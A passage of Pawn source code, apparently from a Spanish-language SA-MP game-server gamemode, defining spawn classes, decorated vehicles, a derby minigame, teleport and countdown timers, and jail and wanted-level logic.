	 AddPlayerClass(246,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(247,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(248,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(249,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(250,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(251,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(253,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	//Classes Note: Some of the Classes are Cams so give Credit to him too
	/*AddPlayerClass(27,-2062.5583,237.4662,36.2890,268.8936,0,0,0,0,0,0); //SF Worker
	AddPlayerClass(296,-2653.6443,1388.2767,8.0739,212.8453,0,0,0,0,0,0); //SF Pimp
	AddPlayerClass(259,-2642.2583,-274.9985,8.3506,135.0036,0,0,0,0,0,0); //SF Golfer
	AddPlayerClass(294,-2188.8037,609.8431,36.2624,82.8703,0,0,0,0,0,0); //SF Triad
	AddPlayerClass(287,-1377.4271,466.0897,8.9393,1.0348,0,0,0,0,0,0); //SF ARMY
	AddPlayerClass(50,-540.9334,-493.9939,25.5234,2.1357,0,0,0,0,0,0); //SF Mechanic
	AddPlayerClass(274,-2665.4282,635.6348,16.0054,179.8403,0,0,0,0,0,0); //SF Medic
	AddPlayerClass(285,-1635.0077,665.8105,8.4054,264.2244,0,0,0,0,0,0); //SF SWAT
    AddPlayerClass(167,-2671.8293,267.5992,4.3359,358.9251,0,0,0,0,0,0); //SF Chicken
	AddPlayerClass(295,-2664.8037,938.6110,80.7618,180.7716,0,0,0,0,0,0); //SF Toreno
	AddPlayerClass(61,-1358.6774,-243.8737,15.6769,315.6869,0,0,0,0,0,0); //SF Pilot
	AddPlayerClass(122,-1430.1825,1492.3381,8.0482,91.3221,0,0,0,0,0,0); //SF Da Nang

	AddPlayerClass(102,832.2958,-1080.4476,24.2969,107.7328,0,0,0,0,0,0); //LV Balla
	AddPlayerClass(103,832.2958,-1080.4476,24.2969,107.7328,0,0,0,0,0,0); //LV Balla
	AddPlayerClass(104,832.2958,-1080.4476,24.2969,107.7328,0,0,0,0,0,0); //LV Balla
	AddPlayerClass(105,2495.2207,-1687.3169,13.5152,107.7328,0,0,0,0,0,0); //LV Grove
	AddPlayerClass(106,2495.2207,-1687.3169,13.5152,107.7328,0,0,0,0,0,0); //LV Grove
	AddPlayerClass(107,2495.2207,-1687.3169,13.5152,107.7328,0,0,0,0,0,0); //LV Grove
	AddPlayerClass(108,2459.0442,-949.4450,80.0800,107.7328,0,0,0,0,0,0); //LV Vago
	AddPlayerClass(110,2459.0442,-949.4450,80.0800,107.7328,0,0,0,0,0,0); //LV Vago
	AddPlayerClass(114,1761.7893,-1892.7225,13.5551,107.7328,0,0,0,0,0,0); //LV Azteca
	AddPlayerClass(115,1761.7893,-1892.7225,13.5551,107.7328,0,0,0,0,0,0); //LV Azteca
	AddPlayerClass(116,1761.7893,-1892.7225,13.5551,107.7328,0,0,0,0,0,0); //LV Azteca
	AddPlayerClass(122,1499.2067,-937.3587,37.4407,107.7328,0,0,0,0,0,0); //LV Triad
	AddPlayerClass(123,1499.2067,-937.3587,37.4407,107.7328,0,0,0,0,0,0); //LV Triad
	AddPlayerClass(274,1499.2067,-937.3587,37.4407,107.7328,0,0,0,0,0,0); //LV Medic
	AddPlayerClass(275,1499.2067,-937.3587,37.4407,107.7328,0,0,0,0,0,0); //LV Medic
	AddPlayerClass(277,1499.2067,-937.3587,37.4407,107.7328,0,0,0,0,0,0); //LV Fireman
	AddPlayerClass(280,1552.5618,-1675.3375,16.1953,107.7328,0,0,0,0,0,0); //LV Cop
	AddPlayerClass(281,1552.5618,-1675.3375,16.1953,107.7328,0,0,0,0,0,0); //LV Cop
	AddPlayerClass(283,1552.5618,-1675.3375,16.1953,107.7328,0,0,0,0,0,0); //LV Cop
	AddPlayerClass(287,1552.5618,-1675.3375,16.1953,112.5582,0,0,0,0,0,0); //LV Army
	AddPlayerClass(286,1552.5618,-1675.3375,16.1953,112.5582,0,0,0,0,0,0); //LV Swat
	AddPlayerClass(214,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian
	AddPlayerClass(215,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian
	AddPlayerClass(216,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian
	AddPlayerClass(251,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian
	AddPlayerClass(253,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian
	AddPlayerClass(254,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian
	AddPlayerClass(255,1552.5618,-1675.3375,16.1953,269.1425,0,0,0,0,0,0); //LV Civillian

	AddPlayerClass(280,1552.4381,-1675.6388,16.1953,91.0541,0,0,0,0,0,0); //LS Cop
	AddPlayerClass(284,1527.4740,-1676.5242,5.8906,221.3641,0,0,0,0,0,0); //LS Cop
	AddPlayerClass(106,2516.3032,-1674.7357,13.9314,62.4839,0,0,0,0,0,0); //LS Grove
	AddPlayerClass(107,2486.7520,-1646.4600,14.0703,183.2633,0,0,0,0,0,0); //LS Grove
	AddPlayerClass(108,2627.3525,-1457.3615,31.0251,5.0687,0,0,0,0,0,0); //LS Vago
	AddPlayerClass(109,2633.3894,-1435.1416,30.4864,232.3824,0,0,0,0,0,0); //LS Vago
	AddPlayerClass(115,1733.9663,-2098.1926,14.0366,171.6405,0,0,0,0,0,0); //LS Aazteca
	AddPlayerClass(116,1804.0708,-2124.1572,13.9424,0.7752,0,0,0,0,0,0); //LS Azteca
	AddPlayerClass(104,768.6387,-1696.5547,5.1554,96.1184,0,0,0,0,0,0); //LS Balla
	AddPlayerClass(103,767.3694,-1655.5189,5.6094,100.1684,0,0,0,0,0,0); //LS Balla
	AddPlayerClass(155,2101.5129,-1806.4567,13.5547,87.8965,0,0,0,0,0,0); //LS PizzaBoy*/

	///////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////   VENICULOS CON OBJETOS   ////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////////
     vehobj = 	 CreateVehicle(578, 298.2863, -1825.4189, 4.5336, 25.7385, -1, -1, 100);
	 VehicleInfo[vehobj][ConObjetos] = 1;
     Obj[0] = 	 CreateObject(19128, -11.22240, -2.28324, 3.41254,   0.00000, 0.00000, 90.00000);
     Obj[1] = 	 CreateObject(19128, -11.22240, -6.28320, 3.41250,   0.00000, 0.00000, 90.00000);
     Obj[2] = 	 CreateObject(19420, -11.11920, -0.27869, 4.12812,   90.00000, 0.00000, 0.00000);
     Obj[3] = 	 CreateObject(19143, -12.42198, -0.35391, 4.86045,   0.00000, 0.00000, 180.00000);
     Obj[4] = 	 CreateObject(19144, -11.92200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
     Obj[5] = 	 CreateObject(19145, -11.42200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
     Obj[6] = 	 CreateObject(19146, -10.92200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
     Obj[7] = 	 CreateObject(19147, -10.42200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
     Obj[8] = 	 CreateObject(19148, -9.92200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
     Obj[9] = 	 CreateObject(19127, -13.07974, -8.11392, 4.01979,   0.00000, 0.00000, 0.00000);
     Obj[10] = 	 CreateObject(19127, -9.41040, -8.11390, 4.01980,   0.00000, 0.00000, 0.00000);
     Obj[11] = 	 CreateObject(19127, -9.41040, -0.61390, 4.01980,   0.00000, 0.00000, 0.00000);
     Obj[12] = 	 CreateObject(19127, -13.07970, -0.61390, 4.01980,   0.00000, 0.00000, 0.00000);
     Obj[13] = 	 CreateObject(18655, -9.37927, -0.61893, 3.46325,   0.00000, 0.00000, 56.00000);
     Obj[14] = 	 CreateObject(18655, -13.07000, -8.09340, 3.46330,   0.00000, 0.00000, -136.00000);
     Obj[15] = 	 CreateObject(1723, -10.22017, -7.53540, 3.39441,   0.00000, 0.00000, 180.00000);
     Obj[16] = 	 CreateObject(18651, -9.84851, 0.75535, 3.35982,   0.00000, 0.00000, 0.00000);
     Obj[17] = 	 CreateObject(18651, -12.41032, 0.73555, 3.35980,   0.00000, 0.00000, 0.00000);
     Obj[18] = 	 CreateObject(2232, -9.87104, -1.44249, 4.04030,   0.00000, 0.00000, -20.00000);
     Obj[19] = 	 CreateObject(2232, -12.45320, -1.37381, 4.04030,   0.00000, 0.00000, 20.00000);
     Obj[20] = 	 CreateObject(19087, -9.42067, -8.12922, 4.42657,   90.00000, 0.00000, 0.00000);
     Obj[21] = 	 CreateObject(19087, -9.42070, -6.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[22] = 	 CreateObject(19087, -9.42070, -4.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[23] = 	 CreateObject(19087, -9.42070, -3.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[24] = 	 CreateObject(19087, -13.07330, -8.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[25] = 	 CreateObject(19087, -13.07330, -6.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[26] = 	 CreateObject(19087, -13.07330, -4.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[27] = 	 CreateObject(19087, -13.07330, -3.12920, 4.42660,   90.00000, 0.00000, 0.00000);
     Obj[28] = 	 CreateObject(19087, -9.48827, -8.10955, 4.42660,   90.00000, 0.00000, 90.00000);
     Obj[29] = 	 CreateObject(19087, -10.48830, -8.10950, 4.42660,   90.00000, 0.00000, 90.00000);
     Obj[30] = 	 CreateObject(642, -12.10328, -6.22676, 4.83699,   0.00000, 0.00000, 0.00000);
     AttachObjectToVehicle(Obj[0], vehobj, -0.064399, 0.324759, -0.206860,  0.000000, 0.000000, 90.000000);
     AttachObjectToVehicle(Obj[1], vehobj, -0.064399, -3.675199, -0.206900,  0.000000, 0.000000, 90.000000);
     AttachObjectToVehicle(Obj[2], vehobj, 0.038800, 2.329309, 0.508719,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[3], vehobj, -1.263979, 2.254090, 1.241049,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[4], vehobj, -0.763999, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[5], vehobj, -0.263999, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[6], vehobj, 0.236000, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[7], vehobj, 0.736000, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[8], vehobj, 1.236000, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[9], vehobj, -1.921739, -5.505920, 0.400390,  0.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[10], vehobj, 1.747599, -5.505900, 0.400400,  0.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[11], vehobj, 1.747599, 1.994100, 0.400400,  0.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[12], vehobj, -1.921700, 1.994100, 0.400400,  0.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[13], vehobj, 1.778730, 1.989070, -0.156150,  0.000000, 0.000000, 56.000000);
     AttachObjectToVehicle(Obj[14], vehobj, -1.911999, -5.485400, -0.156100,  0.000000, 0.000000, -136.000000);
     AttachObjectToVehicle(Obj[15], vehobj, 0.937829, -4.927399, -0.224990,  0.000000, 0.000000, 180.000000);
     AttachObjectToVehicle(Obj[16], vehobj, 1.309490, 3.363349, -0.259580,  0.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[17], vehobj, -1.252320, 3.343549, -0.259599,  0.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[18], vehobj, 1.286959, 1.165510, 0.420899,  0.000000, 0.000000, -20.000000);
     AttachObjectToVehicle(Obj[19], vehobj, -1.295200, 1.234189, 0.420899,  0.000000, 0.000000, 20.000000);
     AttachObjectToVehicle(Obj[20], vehobj, 1.737330, -5.521220, 0.807169,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[21], vehobj, 1.737299, -3.521199, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[22], vehobj, 1.737299, -1.521199, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[23], vehobj, 1.737299, -0.521199, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[24], vehobj, -1.915300, -5.521200, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[25], vehobj, -1.915300, -3.521199, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[26], vehobj, -1.915300, -1.521199, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[27], vehobj, -1.915300, -0.521199, 0.807199,  90.000000, 0.000000, 0.000000);
     AttachObjectToVehicle(Obj[28], vehobj, 1.669730, -5.501550, 0.807199,  90.000000, 0.000000, 90.000000);
     AttachObjectToVehicle(Obj[29], vehobj, 0.669699, -5.501500, 0.807199,  90.000000, 0.000000, 90.000000);
     AttachObjectToVehicle(Obj[30], vehobj, -0.945280, -3.618759, 1.217589,  0.000000, 0.000000, 0.000000);
     veh1 = 	 CreateVehicle(463, -1428.7313, 2165.5103, 49.8121, 278.0257, -1, -1, 100);
	 VehicleInfo[veh1][ConObjetos] = 1;
     Obj1[0] = 	 CreateObject(362,0,0,-1000,0,0,0,100);
     Obj1[1] = 	 CreateObject(362,0,0,-1000,0,0,0,100);
	 AttachObjectToVehicle(Obj1[0], veh1, -0.225000,0.150000,0.450000,0.000000,21.600002,94.499977);
     AttachObjectToVehicle(Obj1[1], veh1, 0.375000,0.150000,0.450000,0.000000,21.600002,94.499977);
	return 1;
}
public OnPlayerUpdate(playerid)
{
	//============================================ SISTEMA DE DERBY ========================================
		if(PI[playerid][P_GAMEMODE] == GAME_DERBY)
	{
		if(PI[playerid][P_STATUS] == STATUS_SPAWNED && PI[playerid][P_DERBY_STATUS] == PD_NORMAL && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			if(GetPlayerVirtualWorld(playerid) != DERBY_VIRTUAL_WORLD) SetPlayerVirtualWorld(playerid, DERBY_VIRTUAL_WORLD); // Si el jugador está en otro virtual world...

			if(DI[STATUS] == DERBY_RUNNING && DI[ACTIVE_PLAYERS] > 1)
			{
				new Float:p[3];
				GetVehiclePos(PI[playerid][P_DERBY_VEHICLEID], p[0], p[1], p[2]);
				if(p[2] <= DI[ZPOS]) PlayerDerbyDead(playerid);
			}
			else if(DI[STATUS] == DERBY_WAIT)
			{
				if(!IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID])) // Si no existe el vehículo
				{
					PI[playerid][P_DERBY_VEHICLEID] = CreateVehicle(DI[MODELID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0, DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3], -1, -1, -1, false);
					SetVehicleParamsEx(PI[playerid][P_DERBY_VEHICLEID], VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
					SetVehicleVirtualWorld(PI[playerid][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
					PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
				}
				if(GetPlayerVehicleID(playerid) != PI[playerid][P_DERBY_VEHICLEID]) // Si el jugador está en otro vehículo
				{
					SetVehicleVirtualWorld(PI[playerid][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
					SetVehiclePos(PI[playerid][P_DERBY_VEHICLEID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0);
					SetVehicleZAngle(PI[playerid][P_DERBY_VEHICLEID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3]);
					PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
					return 1;
				}

				new Float:p[3];
				GetVehiclePos(PI[playerid][P_DERBY_VEHICLEID], p[0], p[1], p[2]);
				if(p[2] <= (DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] - 0.5)) // Si el vehículo se cae al vacío
				{
					SetVehiclePos(PI[playerid][P_DERBY_VEHICLEID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0);
					SetVehicleZAngle(PI[playerid][P_DERBY_VEHICLEID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3]);
				}
			}
		}
	}
	/////////////////////////////////////////////////////////////////////////////////////////////////////
	if(!IsPlayerConnected(playerid)) return 0;
	new UsandoWeaponHacks[128];
    SetPlayerVip(playerid);
    if(!IsPlayerInRangeOfPoint(playerid,20000.0,0.0,0.0,0.0))
	{
	    format(UsandoWeaponHacks, sizeof(UsandoWeaponHacks), "{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Posible Weapon Crasher)",PlayerName2(playerid),playerid);
		SendClientMessageToAll(red, UsandoWeaponHacks);
		SaveToFile("KickLog",UsandoWeaponHacks);
 		Kick(playerid);
		return 1;
	}
	if(GetPlayerCameraMode(playerid) == 53)
    {
        new Float:kLibPos[3];
        GetPlayerCameraPos(playerid, kLibPos[0], kLibPos[1], kLibPos[2]);
        if ( kLibPos[2] < -50000.0 || kLibPos[2] > 50000.0)
        {
            format(UsandoWeaponHacks, sizeof(UsandoWeaponHacks), "{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Posible Weapon Crasher)",PlayerName2(playerid),playerid);
			SendClientMessageToAll(red, UsandoWeaponHacks);
			SaveToFile("KickLog",UsandoWeaponHacks);
 			Kick(playerid);
            return 0;
        }
    }
    if(Joined[playerid] == true)
	{
	    if(RaceStarted == 0)
		{
			TogglePlayerControllable(playerid, 0);
		}
		return 1;
	}
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
        SetVehicleParamsForPlayer(vehicleid,forplayerid,0,PlayerInfo[forplayerid][DoorsLocked]==1);
        return 1;
}
//==================================Count Timer=================================
public ttimer(playerid)
{
    if (tseconds[playerid])
    {
        format(tstring,6,"~w~%d", tseconds[playerid]-1);
        GameTextForPlayer(playerid,tstring,1100,4);
        tseconds[playerid] --;
		if(PlayerInfo[playerid][Level] >= 1) tseconds[playerid] = 0;
        if (!tseconds[playerid])
        {
            new vsid = GetPlayerVehicleID(playerid);
			if (Ti[playerid]>=0) SetPlayerInterior(playerid,Ti[playerid]), Ti[playerid]=-1;
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) SetVehiclePos(vsid,Tx[playerid],Ty[playerid],Tz[playerid]), PutPlayerInVehicle(playerid,vsid,0);
			else SetPlayerPos(playerid,Tx[playerid],Ty[playerid],Tz[playerid]);
			GameTextForPlayer(playerid,telestring,2500,3);
			KillTimer(TeleTimer[playerid]);
			TogglePlayerControllable(playerid,0);
			SetTimerEx("resetTcount",20000, 0, "i", playerid);
			SetTimerEx("UnfreezeTele",2000, 0, "i", playerid);
        }
    }
}

stock TimedTele(playerid, telename[], Float:Px, Float:Py, Float:Pz, interior, seconds)
{
	TeleTimer[playerid] = SetTimerEx("ttimer", 1000, true, "i",playerid);
	tseconds[playerid] = seconds;
	if(PlayerInfo[playerid][Level] == 0)
	vCount[playerid] = 1;
	Tx[playerid] =Px;
	Ty[playerid] =Py;
	Tz[playerid] =Pz;
	Ti[playerid] = interior;
	format(telestring,43,telename);
	return 1;
}
//=================================Reset Count==================================
public resetTcount(playerid)
{
	if (IsPlayerConnected(playerid)) vCount[playerid] = 0;
}
//==================================Count Timer=================================
public ctimer()
{
	if (cseconds)
	{
		format(cstring,6,"~w~%d", cseconds-1);
		GameTextForAll(cstring,1100,4);
		SoundForAll(1056);
		cseconds --;
		if (!cseconds)
		{
			GameTextForAll("~w~GO GO GO!",2000,4);
			SoundForAll(1057);
			KillTimer(CountingTimer);
			for (new i = 0; i < GetMaxPlayers(); i ++)
			{
				if (IsPlayerConnected(i)) SetTimer("resetcount",2000,0);
			}
		}
	}
}

stock SoundForAll(sound)
{
	for (new i = 0; i <= GetMaxPlayers(); i ++)
	{
		if (IsPlayerConnected(i) == 1) {
			PlayerPlaySound(i,sound,0.0,0.0,0.0);
		}
	}
}
//==========================Selection Screen Stuff==============================
public OnPlayerRequestClass(playerid, classid)
{
	///================================= SISTEMA DE DERBY =================================
    	if(PI[playerid][P_STATUS] != STATUS_CONNECTED && PI[playerid][P_STATUS] != STATUS_CLASS)
	{
		if(PI[playerid][P_GAMEMODE] == GAME_DERBY) KickPlayerFromDerby(playerid);
	}
	PI[playerid][P_STATUS] = STATUS_CLASS;
	///////////////////////////////////////////////
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,-758.8698,2041.1375,77.8984);
	SetPlayerCameraLookAt(playerid, -758.8698,2041.1375,77.8984,CAMERA_MOVE);
	SetPlayerFacingAngle(playerid,234.6952);
	SetPlayerCameraPos(playerid,-753.8698,2041.1375,77.8984);
	/*SetPlayerPos(playerid,2074.0986,1247.5724,716.1840);
	SetPlayerFacingAngle(playerid, -90.436264);
    SetPlayerCameraPos(playerid, 2079.5432,1249.8418,716.6501);
	SetPlayerCameraLookAt(playerid, 2071.2625,1245.6322,715.9300,CAMERA_MOVE);*/
	ApplyAnimation(playerid, "GYMNASIUM", "gym_shadowbox",  4.1,7,5,1,1,1);
	ApplyAnimation(playerid, "GYMNASIUM", "gym_shadowbox",  4.1,7,5,1,1,1);
	return 1;
}


//================================Random Functions==============================
public SystemMsg(playerid,msg[])
{
	if ((IsPlayerConnected(playerid))&&(strlen(msg)>0))
	{
		SendClientMessage(playerid,COLOR_SYSTEM,msg);
	}
	return 1;
}
//===============================Kick timer=====================================
/*public KickTimer(playerid)
{
	if(PlayerInfo[playerid][LoggedIn] == 0)
	{
		new string[128];
		format(string, sizeof(string), "{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Contraseña Incorrecta)", PlayerName2(playerid), playerid );
		SendClientMessageToAll(red, string);
		Kick(playerid);
	}
}*/
//======================Job System Defines and Functions========================
new LawEnforcementRadio[MAX_PLAYERS];
new HasLawEnforcementRadio[MAX_PLAYERS];
new ReqBk[MAX_PLAYERS];
new ReqBkRecent[MAX_PLAYERS];
new ReportedRecent[MAX_PLAYERS];
new StoleCopCarRecent[MAX_PLAYERS];
new triedtoescaperecent[MAX_PLAYERS];
new JailTime[MAX_PLAYERS];
new JailTimeServed[MAX_PLAYERS];
new copshavevc[MAX_PLAYERS];
new commitedcrimerecently[MAX_PLAYERS];
new RobbedPlyRecent[MAX_PLAYERS];
new OldCash[MAX_PLAYERS];
new beenrobbedrecently[MAX_PLAYERS];

stock IsPlayerNearPlayer(playerid, nearplayerid, Float:maxdis)
{
	new Float:pos[6];
	GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
	GetPlayerPos(nearplayerid, pos[3], pos[4], pos[5]);
	if (pos[0] >= floatsub(pos[3], maxdis) && pos[0] <= floatadd(pos[3], maxdis)
	&& pos[1] >= floatsub(pos[4], maxdis) && pos[1] <= floatadd(pos[4], maxdis)
	&& pos[2] >= floatsub(pos[5], maxdis) && pos[2] <= floatadd(pos[5], maxdis))
	{
		return 1;
	}
	return 0;
}
stock GetPlayerCaption( playerid )
{
	   new szName[ 128 ];
	   GetPlayerName( playerid, szName, sizeof( szName ) );
	   return szName;
}

public Float:GetDistanceBetweenPlayers(p1,p2){
	new Float:x3,Float:y3,Float:z3,Float:x4,Float:y4,Float:z4;
	if (!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
	{
		return -1.00;
	}
	GetPlayerPos(p1,x3,y3,z3);
	GetPlayerPos(p2,x4,y4,z4);
	return floatsqroot(floatpower(floatabs(floatsub(x4,x3)),2)+floatpower(floatabs(floatsub(y4,y3)),2)+floatpower(floatabs(floatsub(z4,z3)),2));
}


//================================ AUTO TANQUE ==============================================
public ShotFire(playerid)
{
	FireShot[playerid] = 0;
	return 1;
}
//==============================================================================
public OnObjectMoved(objectid)
{
 xFireworks_OnObjectMoved(objectid);// Fireworks
	//Fire Shoot Vip
	for(new i;i<MAX_PLAYERS;i++)
	{
		if(objectid == gRocketObj[i])
		{
		    new
				Float:x,
				Float:y,
				Float:z;

		    GetObjectPos(gRocketObj[i], x, y, z);
		    CreateExplosion(x, y, z, 11, 3.0);
		    DestroyObject(gRocketObj[i]);
		}
	}
 return 1;
 }

//=============================Criminal System==================================
forward StoleCopCarRecentTimer();
public StoleCopCarRecentTimer()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
      if(StoleCopCarRecent[i] == 1 && IsPlayerConnected(i))
	  {
       StoleCopCarRecent[i] =0;

    }
  }
}


public ReqMechRecentTime()
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (RecentAskedMechanic[i] ==1)
		{
			RecentAskedMechanic[i] =0;
		}
	}
}

public SandEngine()
{
    for(new v = 0; v < MAX_VEHICLES; v++)
	{
      if(SandInEngine[v] == 1)
	  {
        new Float:vHealth;
	    GetVehicleHealth(v, vHealth);
	    SetVehicleHealth(v, vHealth -100);

      }
   }
}

public fixedcarrecenttimer()
{
    for(new i=0; i < MAX_PLAYERS; i++)
    {
        if (IsPlayerConnected(i) && IsSpawned[i] ==1)
        {
           if (fixedcarrecent[i] >= 1)
            {
                fixedcarrecent[i] --;
			}
		}
	}
}

public commitedcrimerecent()
{
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(commitedcrimerecently[i] >= 1)
		{
			commitedcrimerecently[i] --;
		}
	}
}

public JailFood()
{
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(IsPlayerConnected(i) && PlayerInfo[i][Jailed] == 1)
		{
			new Float:health;
			GetPlayerHealth(i, health);
			if(health <=90) {
				SetPlayerHealth(i,health+9);
			}
		}
	}
}

public copshavevctimer()
{
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(copshavevc[i] >= 1)
		{
			copshavevc[i] --;
		}
	}
}

public WantedLevelReduce()
{
	for (new i = 0; i < GetMaxPlayers(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(IsSpawned[i] == 1)
			{
				if(commitedcrimerecently[i] == 0)
				{
					if(GetPlayerWantedLevel(i) >= 1 && GetPlayerWantedLevel(i) <= 9)
					{
						if(copshavevc[i] == 0)
						{
							new plwl = GetPlayerWantedLevel(i);
					 		SetPlayerWantedLevel(i,plwl -1);
					 		plwl = GetPlayerWantedLevel(i);
					 		//ircSay(EchoConnection, EchoChan,string);
						}
					}
				}
			}
		}
	}
}

public AutoUnjail()
{
	for(new i=0; i < GetMaxPlayers(); i++)
	{
		if (IsPlayerConnected(i))
		{
			if(PlayerInfo[i][Jailed] == 1)
			{
				if (JailTime[i] > 0)
				{
			  		JailTime[i] --;
                    new jtime;
                    new string[128];
				    jtime = (JailTime[i]);
                    format(string, sizeof(string), "~w~TIEMPO EN PRISION:~n~ %d",jtime);
					GameTextForPlayer(i, string,2000,4);
					JailTimeServed[i] ++;
				}
				if (JailTime[i] == 0)
				{
			  		new pname[24];
			  		GetPlayerName(i, pname, 24);
			  		//new string[128];
			  		SetPlayerInterior(i,3);
			 		SetPlayerPos(i,210.5272,146.3341,1003.0234);
			  		SetPlayerFacingAngle(i,179.4662);
			  		SetCameraBehindPlayer(i);
			  		//ircSay(EchoConnection, EchoChan,string);
					PlayerInfo[i][Jailed] = 0;
			   		JailTimeServed[i] =0;
			  		//dUserSetINT(PlayerName(i)).("Jailed",PlayerInfo[i][Jailed]);
					//dUserSetINT(PlayerName(i)).("jailtime",JailTime[i]);
				}
			}
		}
	}
}

public VehicleRepairedRecent()
{
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(RecentVR[i] == 1)
		{
			RecentVR[i] =0;
		}
	}
}

public BeenReported()
{
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(ReportedRecent[i] == 1 && IsPlayerConnected(i))
		{
			ReportedRecent[i] =0;
		}
	}
}


public ReqBkRecentTime()
{
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(ReqBkRecent[i] == 1 && IsPlayerConnected(i))
		{
			ReqBkRecent[i] =0;
		}
	}
}

stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
